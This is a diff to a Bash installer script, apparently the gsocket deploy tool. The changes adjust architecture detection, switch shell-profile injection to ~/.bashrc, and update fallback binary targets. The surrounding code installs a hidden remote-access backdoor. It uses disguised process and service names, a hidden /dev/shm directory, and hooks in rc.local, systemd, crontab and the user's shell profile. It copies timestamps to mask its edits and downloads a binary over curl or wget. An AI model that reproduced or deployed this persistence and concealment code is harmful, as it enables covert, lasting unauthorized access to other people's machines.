@@ -107,33 +107,28 @@ init_vars()
 	local arch
 	arch=$(uname -m)
 	if [[ $OSTYPE == *linux* ]]; then 
-		if [[ x"$arch" == "xi686" ]]; then
-			if [[ $(uname -r) == *arch* ]]; then
-				OSARCH="i686-arch"
-			else
-				OSARCH="i686-debian"
-			fi
-		elif [[ x"$arch" == "xarmv6l" ]]; then
-			OSARCH="armv6l-linux"
-		else
-			if grep Arch /etc/issue &>/dev/null; then
-				OSARCH="x86_64-arch"
-			else
-				OSARCH="x86_64-debian"
-			fi
+		if [[ x"$arch" == "xi686" ]] || [[ x"$arch" == "xi386" ]]; then
+			OSARCH="i386-alpine"
+		elif [[ x"$arch" == "xarmv6l" ]] || [[ x"$arch" == "xarmv7l" ]]; then
+			OSARCH="armv6l-linux" # RPI-Zero / RPI 4b+
+		elif [[ x"$arch" == "xaarch64" ]]; then
+			OSARCH="aarch64-linux"
 		fi
 	elif [[ $OSTYPE == *darwin* ]]; then
+		if [[ x"$arch" == "xarm64" ]]; then
+			OSARCH="arm64-osx" # M1
+		else
 			OSARCH="x86_64-osx"
+		fi
 	elif [[ $OSTYPE == *FreeBSD* ]]; then
 			OSARCH="x86_64-freebsd"
 	elif [[ $OSTYPE == *cygwin* ]]; then
 			OSARCH="x86_64-cygwin"
+	# elif [[ $OSTYPE == *gnu* ]] && [[ "$(uname -v)" == *Hurd* ]]; then
+			# OSARCH="i386-hurd" # debian-hurd
 	fi
 
-	if grep Alpine /etc/issue &>/dev/null; then
-		OSARCH="x86_64-alpine"
-	fi
-	[[ -z "$OSARCH" ]] && OSARCH="x86_64-debian" # Try debian 64bit as last resort
+	[[ -z "$OSARCH" ]] && OSARCH="x86_64-alpine" # Default: Try Alpine(muscl libc) 64bit
 
 	if [[ -d /dev/shm ]]; then
 		TMPDIR="/dev/shm/.gs-${UID}"
@@ -175,7 +170,13 @@ init_vars()
 	RCLOCAL_DIR="${GS_PREFIX}/etc"
 	RCLOCAL_FILE="${RCLOCAL_DIR}/rc.local"
 
-	RC_FILE="${GS_PREFIX}${HOME}/.profile"
+	RC_FILENAME=".profile"
+	RC_FILENAME_STATUS=".profile"
+	if [[ -f ~/.bashrc ]]; then
+		RC_FILENAME=".bashrc"
+		RC_FILENAME_STATUS=".bashrc." # for status output ~/.bashrc.....[OK]
+	fi
+	RC_FILE="${GS_PREFIX}${HOME}/${RC_FILENAME}"
 
 	SERVICE_DIR="${GS_PREFIX}/etc/systemd/system"
 	SERVICE_FILE="${SERVICE_DIR}/${SERVICE_HIDDEN_NAME}.service"
@@ -191,9 +192,9 @@ init_setup()
 		mkdir -p "${GS_PREFIX}/etc" 2>/dev/null
 		mkdir -p "${GS_PREFIX}/usr/bin" 2>/dev/null
 		mkdir -p "${GS_PREFIX}${HOME}" 2>/dev/null
-		if [[ -f "${HOME}/.profile" ]]; then
-			cp "${HOME}/.profile" "${GS_PREFIX}${HOME}/.profile"
-			touch -r "${HOME}/.profile" "${GS_PREFIX}${HOME}/.profile"
+		if [[ -f "${HOME}/${RC_FILENAME}" ]]; then
+			cp "${HOME}/${RC_FILENAME}" "${RC_FILE}"
+			touch -r "${HOME}/${RC_FILENAME}" "${RC_FILE}"
 		fi
 		cp /etc/rc.local "${GS_PREFIX}/etc/"
 		touch -r /etc/rc.local "${GS_PREFIX}/etc/rc.local"
@@ -288,6 +289,7 @@ uninstall()
 	uninstall_rmdir "${TMPDIR}"
 
 	# Remove from login script
+	uninstall_rc "${GS_PREFIX}${HOME}/.bashrc"
 	uninstall_rc "${GS_PREFIX}${HOME}/.profile"
 	uninstall_rc "${GS_PREFIX}/etc/rc.local"
 
@@ -469,7 +471,7 @@ install_user_crontab()
 
 install_user_profile()
 {
-	echo -en 2>&1 "Installing access via ~/.profile......................................"
+	echo -en 2>&1 "Installing access via ~/${RC_FILENAME_STATUS}......................................"
 	[[ -z "$KL_CMD" ]] && { FAIL_OUT "No pkill or killall found."; return; }
 	[[ -f "${RC_FILE}" ]] || { touch "${RC_FILE}"; chmod 600 "${RC_FILE}"; }
 	if grep "$BIN_HIDDEN_NAME" "$RC_FILE" &>/dev/null; then
@@ -533,7 +535,7 @@ dl()
 	if [[ "$DL_CMD" == "$DL_CRL" ]]; then
 		dl_log=$(curl -fL "${URL_BASE}/${1}" --output "${2}" 2>&1)
 	elif [[ "$DL_CMD" == "$DL_WGT" ]]; then
-		dl_log=$(wget --show-progress -O "$2" "${URL_BASE}/${1}" 2>&1)
+		dl_log=$(wget -O "$2" "${URL_BASE}/${1}" 2>&1)
 	else
 		# errexit "Need curl or wget."
 		FAIL_OUT "CAN NOT HAPPEN"
@@ -569,7 +571,7 @@ test_bin()
 
 	bin="$1"
 
-	GS_SECRET=$("$bin" -g)
+	GS_SECRET=$("$bin" -g 2>/dev/null)
 	[[ -z "$GS_SECRET" ]] && { FAIL_OUT; ERR_LOG="wrong binary"; WARN_EXECFAIL_SET "$?" "wrong binary"; return; }
 
 	err_log=$(GSOCKET_ARGS="-s selftest-${GS_SECRET}" exec -a "$PROC_HIDDEN_NAME" "${bin}" 2>&1)
@@ -628,7 +630,7 @@ try()
 # binaries and fail hard if none could be found.
 try_any()
 {
-	targets="x86_64-debian i386-debian i686-arch x86_64-alpine i686-debian x86_64-centos"
+	targets="x86_64-alpine i386-alpine x86_64-debian aarch64-linux armv6l-linux x86_64-cygwin x86_64-freebsd x86_64-osx"
 	for osarch in $targets; do
 		[[ x"$osarch" = x"$OSARCH" ]] && continue # Skip the default OSARCH (already tried)
 		try "$osarch"
